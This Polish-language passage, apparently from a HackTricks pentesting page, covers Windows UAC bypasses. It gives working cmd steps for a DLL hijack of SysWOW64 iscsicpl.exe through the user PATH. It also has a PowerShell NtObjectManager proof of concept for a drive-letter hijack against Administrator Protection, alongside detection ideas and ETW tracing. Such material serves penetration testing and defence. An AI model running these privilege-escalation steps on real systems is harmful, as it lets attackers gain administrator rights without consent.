Polega na sprawdzeniu, czy **binarny plik autoElevated** próbuje **odczytać** z **rejestru** **nazwę/ścieżkę** binarnego pliku lub **polecenia**, które ma zostać **uruchomione** (jest to szczególnie interesujące, jeśli binarny plik szuka tych informacji w **HKCU**).

### Obejście UAC przez `SysWOW64\iscsicpl.exe` + DLL hijacking z wykorzystaniem zmiennej `PATH` użytkownika

32-bitowy plik `C:\Windows\SysWOW64\iscsicpl.exe` to binarny plik **autoelevated**, który można wykorzystać do załadowania `iscsiexe.dll` zgodnie z kolejnością wyszukiwania. Jeśli umieścisz złośliwy plik `iscsiexe.dll` w folderze **zapisywalnym przez użytkownika**, a następnie zmodyfikujesz zmienną `PATH` bieżącego użytkownika (na przykład przez `HKCU\Environment\Path`), aby system przeszukiwał ten folder, Windows może załadować bibliotekę DLL atakującego do podwyższonego procesu `iscsicpl.exe` **bez wyświetlania monitu UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Uwagi praktyczne:
- Ta metoda jest przydatna, gdy bieżący użytkownik należy do grupy **Administrators**, ale z powodu UAC działa z poziomem **Medium Integrity**.
- W tej metodzie istotna jest kopia z **SysWOW64**. Traktuj kopię z **System32** jako osobny plik binarny i niezależnie sprawdź jej działanie.
- Ta metoda łączy **auto-elevation** z **DLL search-order hijacking**, więc do sprawdzenia, czy brakuje ładowanej biblioteki DLL, przyda się ten sam workflow w ProcMon, co przy innych metodach obejścia UAC.

Minimalny przebieg:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Pomysły na wykrywanie:
- Generuj alerty o użyciu `reg add` / zapisach do rejestru w `HKCU\Environment\Path`, po których bezpośrednio następuje uruchomienie `C:\Windows\SysWOW64\iscsicpl.exe`.
- Wyszukuj `iscsiexe.dll` w **lokalizacjach kontrolowanych przez użytkownika**, takich jak `%TEMP%` lub `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Koreluj uruchomienia `iscsicpl.exe` z nieoczekiwanymi procesami potomnymi lub ładowaniem DLL spoza standardowych katalogów Windows.

### Nowsze badania, które warto sprawdzić osobno

Niektóre łańcuchy opisane po 2024 roku nie przypominają już klasycznych hijacków rejestru `HKCU\Software\Classes`. Na przykład zatruwanie pamięci podręcznej kontekstu aktywacji może łączyć **drive remap** i **DLL redirection**, aby przejść ze średniego do wysokiego poziomu integralności za pośrednictwem zaufanych interfejsów użytkownika / binariów auto-elevated, takich jak `ctfmon.exe`, a następnie celów takich jak `fodhelper.exe`. Zamiast powielać tutaj obszerny PoC, sprawdź zwięzłe przykłady payloadów w:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack litery dysku w Administrator Protection (wersja preview) za pośrednictwem mapy urządzeń DOS dla sesji logowania

> [!NOTE]
> Stan na sierpień 2026 r.: Microsoft nadal opisuje Administrator Protection jako **wersję preview dla programu Insider**: wdrożenie z października 2025 r. zostało wycofane, a jego ponowne wdrożenie zaplanowano na późniejszy termin. Przed testowaniem tych łańcuchów upewnij się, że **Tryb zatwierdzania przez administratora z ochroną Administrator Protection** jest rzeczywiście włączony, a urządzenie zostało ponownie uruchomione; sam ciąg wersji 25H2 nie dowodzi, że ta funkcja jest aktywna.<sup>[[10]](#references)</sup>

Pełny opis powierzchni ataku `RAiLaunchAdminProcess` / UIAccess w kompilacjach preview Windows 11 25H2 znajdziesz na dedykowanej stronie:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection” używa tokenów shadow-admin z mapami `\Sessions\0\DosDevices/<LUID>` przypisanymi do poszczególnych sesji. Katalog jest tworzony leniwie przez `SeGetTokenDeviceMap` przy pierwszym rozwiązaniu ścieżki `\??`. Jeśli atakujący podszywa się pod token shadow-admin na poziomie **SecurityIdentification**, katalog zostaje utworzony z atakującym jako **właścicielem** (dziedziczy `CREATOR OWNER`), co pozwala na tworzenie dowiązań liter dysków mających pierwszeństwo przed `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Kroki:**

1. Z sesji o niskich uprawnieniach wywołaj `RAiProcessRunOnce`, aby uruchomić `runonce.exe` z tokenem shadow-admin, bez wyświetlania monitu.
2. Zduplikuj jego token podstawowy jako token **identification** i podszyj się pod niego podczas otwierania `\??`, aby wymusić utworzenie `\Sessions\0\DosDevices/<LUID>` z atakującym jako właścicielem.
3. Utwórz tam dowiązanie symboliczne `C:` wskazujące na pamięć masową kontrolowaną przez atakującego; kolejne operacje na systemie plików w tej sesji będą rozwiązywać `C:` do ścieżki atakującego, umożliwiając hijack DLL/plików bez wyświetlania monitu.

**PoC w PowerShell (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Na hostach z wersjami preview funkcja Administrator Protection rejestruje zatwierdzenia i niepowodzenia jako zdarzenia ETW **15031** i **15032** dostawcy `Microsoft-Windows-LUA`. Zdarzenia zawierają SID żądającego, ścieżkę aplikacji, wynik, zarządzane konto administratora i metodę uwierzytelniania, więc ponawiane próby exploitów ani nieudane sterowanie interfejsem użytkownika nie pozostają bez śladu w telemetrii.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jak działa Kontrola konta użytkownika](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Kolekcja technik omijania UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Skaner zgodności i launcher technik omijania UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI wykorzystuje AI do generowania backdoorów PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: wykorzystywanie 0-day przeciwko celom rządowym w Azji Południowo-Wschodniej](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Omijanie ochrony administratora w Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Omijanie UAC przy użyciu zadania SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Metody omijania Always Notify przez UnifiedConsent, TabTip i Narrator](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Ochrona administratora](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Wywoływanie lokalnych serwerów RPC systemu Windows z .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte wzbogaca CoolClient o podpisany rootkit jądra Windows](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: w pełni niewykrywalny trojan Windows stworzony do szpiegowania, kradzieży i terroryzowania](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
